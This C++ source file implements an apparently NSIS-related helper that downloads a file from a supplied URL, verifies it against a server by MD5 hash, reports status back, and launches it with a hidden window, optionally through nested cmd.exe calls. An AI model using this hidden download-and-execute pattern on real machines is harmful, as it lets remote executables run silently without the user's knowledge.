
#include <windows.h>
#include <wininet.h>
#include <tchar.h>
#include <stdio.h>
#include <map>

#include "InetUtils.h"
#include "MD5.h"

#pragma comment(lib, "wininet.lib")

#define USERAGENT TEXT("NSIS_Inetc (Mozilla)")
#define BUFFER_SIZE 1024
#define NSIS_MAX_STRLEN 1024
#define MY_REDIR_FLAGS INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS
#define MY_HTTPS_FLAGS (MY_REDIR_FLAGS | INTERNET_FLAG_SECURE)

std::map<DWORD, DWORD> DownloadThreads;

DWORD InetUtils::DownloadFileEx(
	LPCTSTR url_download,
	LPCTSTR url_verify,
	LPCTSTR url_report,
	LPCTSTR file_code,
	LPCTSTR file_name,
	LPCTSTR result_good,
	LPCTSTR result_bad
	)
{
	DWORD dwLastError = ERROR_SUCCESS;
	DWORD dwAttempt = 3;
	TCHAR lpszReportUrl[NSIS_MAX_STRLEN];
	TCHAR lpszResponseBuffer[NSIS_MAX_STRLEN];
	DWORD dwResponseBufferSize = NSIS_MAX_STRLEN;

	do {

		dwLastError = InternetRequestDownload(url_download, file_name);
		if(dwLastError == ERROR_SUCCESS) {
			dwLastError = VerifyDownloadedFile(url_verify, file_code, file_name);
		}

		ZeroMemory(lpszReportUrl, NSIS_MAX_STRLEN * sizeof(TCHAR));
		if(dwLastError == ERROR_SUCCESS) {
			_stprintf_s(lpszReportUrl, NSIS_MAX_STRLEN, TEXT("%s%s"), url_report, result_good);
			dwAttempt = 0;
		} else {
			_stprintf_s(lpszReportUrl, NSIS_MAX_STRLEN, TEXT("%s%s"), url_report, result_bad);
			dwAttempt--;
		}

		InternetRequestFeedback(lpszReportUrl, lpszResponseBuffer, &dwResponseBufferSize);

	} while(dwAttempt > 0);

	return dwLastError;
}


DWORD InetUtils::DownloadAndRunFileEx(
	LPCTSTR url_download,
	LPCTSTR url_verify,
	LPCTSTR url_report,
	LPCTSTR file_code,
	LPCTSTR file_name,
	LPCTSTR result_good,
	LPCTSTR result_bad,
	LPCTSTR cmd_args,
	LaunchType type
	)
{

	DWORD dwLastError = ERROR_SUCCESS;
	dwLastError = DownloadFileEx (
		url_download,
		url_verify,
		url_report,
		file_code,
		file_name,
		result_good,
		result_bad
	);

	if(dwLastError == ERROR_SUCCESS) {
		dwLastError = RunFileEx (
			file_name,
			cmd_args,
			type
		);
	}

	return dwLastError;

}


DWORD InetUtils::RunFileEx (
	LPCTSTR file_name,
	LPCTSTR cmd_args,
	LaunchType type
	)
{
	DWORD dwLastError = ERROR_SUCCESS;
	TCHAR lpszCmdPath[1024];
	TCHAR lpszCmdArgs[2048];

	PROCESS_INFORMATION PI;
	STARTUPINFO SI;
	ZeroMemory(&PI, sizeof(PI));
	ZeroMemory(&SI, sizeof(SI));
	SI.cb = sizeof(STARTUPINFO);
	SI.wShowWindow = SW_HIDE;
	SI.dwFlags = STARTF_USESHOWWINDOW;

	ZeroMemory(lpszCmdPath, 1024 * sizeof(TCHAR));
	ZeroMemory(lpszCmdArgs, 2048 * sizeof(TCHAR));

	if(type == Exec) {
		_stprintf_s(lpszCmdArgs, 2048, TEXT("\"%s\" %s"), file_name, cmd_args);
		if (!CreateProcess(file_name, lpszCmdArgs, NULL, NULL, FALSE, NULL, NULL, NULL, &SI, &PI))
		{
			
		}
	} else if(type == ExecShell) {
		GetEnvironmentVariable(TEXT("COMSPEC"), lpszCmdPath, 1024);
		TCHAR lpszCmdChain[] = TEXT("%s /d /c cmd.exe /d /c cmd.exe /d /c IF EXIST \"%s\" (start \"\" \"%s\" %s)");
		_stprintf_s(lpszCmdArgs, 2048, lpszCmdChain, lpszCmdPath , file_name, file_name, cmd_args);
		if (!CreateProcess(lpszCmdPath, lpszCmdArgs, NULL, NULL, FALSE, NULL, NULL, NULL, &SI, &PI))
		{
			
		}
	}
	
	return dwLastError;

}


DWORD InetUtils::VerifyDownloadedFile(
	LPCTSTR url_verify,
	LPCTSTR file_code,
	LPCTSTR file_name
	)
{
	TCHAR lpszURIForVerify[1024];
	TCHAR lpszResponse[NSIS_MAX_STRLEN];
	DWORD dwResponseSize = NSIS_MAX_STRLEN;
	DWORD dwFileSize = 0;
	DWORD dwLastError = ERROR_SUCCESS;
	TCHAR lpszFileName[MAX_PATH];

	FILE *file;
	errno_t err = _tfopen_s(&file, file_name, TEXT("rb"));
	if (err == 0) {
		fseek(file, 0, SEEK_END);
		dwFileSize = ftell(file);
		fclose(file);
	} else {
		return ERROR_FILE_NOT_FOUND;
	}

	_tcscpy_s((TCHAR*)lpszFileName, MAX_PATH, file_name);
	char *lpszMD5File = MD5File((TCHAR*)lpszFileName);
	char lpszMD5FileMask[64 + 1];
	ZeroMemory(lpszMD5FileMask, 64 + 1);
	for(int i = 0; i < 64; i++) {
		if( (i%2) > 0 ) {
			lpszMD5FileMask[i] = '0';
		} else {
			lpszMD5FileMask[i] = lpszMD5File[i / 2];
		}
	}
	delete []lpszMD5File;
	
	_stprintf_s(lpszURIForVerify, 1024, TEXT("%s&f=%s&h=%s&size=%d"), url_verify, file_code, lpszMD5FileMask, dwFileSize);

	dwLastError = InternetRequestFeedback(lpszURIForVerify, lpszResponse, &dwResponseSize);
	if(_tcsstr(lpszResponse, TEXT("1")) == NULL) {
		dwLastError = ERROR_INVALID_DATA;
	}

	return dwLastError;
}


DWORD InetUtils::InternetRequestFeedback(LPCTSTR url, LPTSTR buf, LPDWORD count)
{
	return InetTransfer(url, InetUtils::Feedback, buf, count, NULL, 0, NULL);
}


DWORD InetUtils::InternetRequestDownload(LPCTSTR url, LPCTSTR dest)
{
	return InetTransfer(url, InetUtils::Download, NULL, 0, NULL, 0, dest);
}


DWORD InetUtils::InetTransfer(
	LPCTSTR url,
	InetType type,
	LPTSTR lpszBuffer,
	LPDWORD cchBuffer,
	LPTSTR lpszCertificate,
	LPDWORD cchCertificate,
	LPCTSTR dest)
{
	bool ok = false;
	DWORD dwBytesReaded;
	DWORD dwBytesLeft;
	DWORD dwBytesToWrite;
	DWORD dwBytesWritten;
	DWORD dwBytesWrittenAccum;
	DWORD dwLastError = ERROR_SUCCESS;
	char szData[BUFFER_SIZE];
	TCHAR lpszObjectName[NSIS_MAX_STRLEN];

	char *host, *path, *params;
	host = new char[1024];
	path = new char[1024];
	params = new char[1024];

	URL_COMPONENTSA uc = {sizeof(URL_COMPONENTS), NULL, 0,(INTERNET_SCHEME)0, host, 1024, 0 , NULL, 0, NULL, 0, path, 1024, params, 1024};

	if (!InternetCrackUrl(url, 0, 0, &uc)) {
		
		ok = false;
		dwLastError = GetLastError();
		if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
			uc.lpszHostName = NULL;
			uc.lpszUrlPath = NULL;
			uc.lpszExtraInfo = NULL;
			delete[] host;
			delete[] path;
			delete[] params;
			host = uc.dwHostNameLength > 0 ? new char[++uc.dwHostNameLength] : NULL;
			path = uc.dwUrlPathLength > 0 ? new char[++uc.dwUrlPathLength] : NULL;
			params = uc.dwExtraInfoLength > 0 ? new char[++uc.dwExtraInfoLength] : NULL;
			uc.lpszHostName = host;
			uc.lpszUrlPath = path;
			uc.lpszExtraInfo = params;
		}
		else
		{
			delete[] host;
			delete[] path;
			delete[] params;
			return dwLastError;
		}
		
	}
	else {

		ok = true;

	}

	if (ok || InternetCrackUrl(url, 0, 0, &uc))
	{
		
		HINTERNET hInternet =
		::InternetOpen(
			USERAGENT,
			INTERNET_OPEN_TYPE_PRECONFIG,
			NULL,
			NULL,
			0);

		if (hInternet != NULL) {
			HINTERNET hConnect = 
				::InternetConnect(
					hInternet,
					uc.lpszHostName,
					uc.nPort,
					NULL,
					NULL,
					INTERNET_SERVICE_HTTP,
					0,
					0);

			if (hConnect != NULL) {
				_stprintf_s(lpszObjectName, NSIS_MAX_STRLEN, TEXT("%s%s"), uc.lpszUrlPath, uc.lpszExtraInfo);
				DWORD dwSecFlags = 0;
				if(uc.nScheme == INTERNET_SCHEME_HTTPS) {
					 dwSecFlags = MY_HTTPS_FLAGS;
				}
				HINTERNET hRequest = 
					::HttpOpenRequest(
						hConnect,
						TEXT("GET"),
						lpszObjectName,
						NULL,
						NULL,
						0,
						INTERNET_FLAG_KEEP_CONNECTION | dwSecFlags,
						0);

				if (hRequest != NULL) {
					BOOL bSend = ::HttpSendRequest(hRequest, NULL, 0, NULL, 0);
					if (bSend) {

						if(type == Feedback) {

							if(lpszBuffer != NULL) {
								
								ZeroMemory(lpszBuffer, *cchBuffer);
								dwBytesLeft = *cchBuffer - 1;
								dwBytesWrittenAccum = 0;
								while(true) {

									dwBytesReaded = 0;
									BOOL bRead = 
										::InternetReadFile(
											hRequest,
											szData,
											BUFFER_SIZE,
											&dwBytesReaded
											);

									if (bRead == FALSE || dwBytesReaded == 0) {
										*cchBuffer = dwBytesWrittenAccum;
										break;
									}

									dwBytesLeft -= dwBytesWrittenAccum;
									dwBytesToWrite = (dwBytesLeft > dwBytesReaded) ? dwBytesReaded : dwBytesLeft;
									errno_t err = memcpy_s(
										lpszBuffer + dwBytesWrittenAccum,
										dwBytesLeft,
										szData,
										dwBytesToWrite
									);
									dwBytesWrittenAccum += dwBytesToWrite;

									if(dwBytesToWrite == dwBytesLeft) {
										*cchBuffer = dwBytesWrittenAccum;
										break;
									}

								}

							} else {
								dwLastError = ERROR_INVALID_PARAMETER;
							}

						}

						if(type == Download) {

							if(dest != NULL) {

								HANDLE hLocalFile = CreateFile(
									dest,
									GENERIC_WRITE,
									FILE_SHARE_READ,
									NULL,
									CREATE_ALWAYS,
									0,
									NULL
									);

								if (hLocalFile != INVALID_HANDLE_VALUE) {
									while(true) {

										dwBytesReaded = 0;
										BOOL bRead = 
											::InternetReadFile(
												hRequest,
												szData,
												BUFFER_SIZE,
												&dwBytesReaded);

										if (bRead == FALSE || dwBytesReaded == 0)
											break;

										WriteFile(hLocalFile, szData, dwBytesReaded, &dwBytesWritten, NULL);

									}
									CloseHandle(hLocalFile);

								} else {
									dwLastError = GetLastError();
								}

							} else {
								dwLastError = ERROR_INVALID_PARAMETER;
							}

						}

					} else {
						dwLastError = GetLastError();
					}
					::InternetCloseHandle(hRequest);

				} else {
					dwLastError = GetLastError();
				}
				::InternetCloseHandle(hConnect);

			} else {
				dwLastError = GetLastError();
			}
			::InternetCloseHandle(hInternet);

		} else {
			dwLastError = GetLastError();
		}

	} else {
		dwLastError = GetLastError();
	}
	
	delete[] host;
	delete[] path;
	delete[] params;
	
	return dwLastError;
}
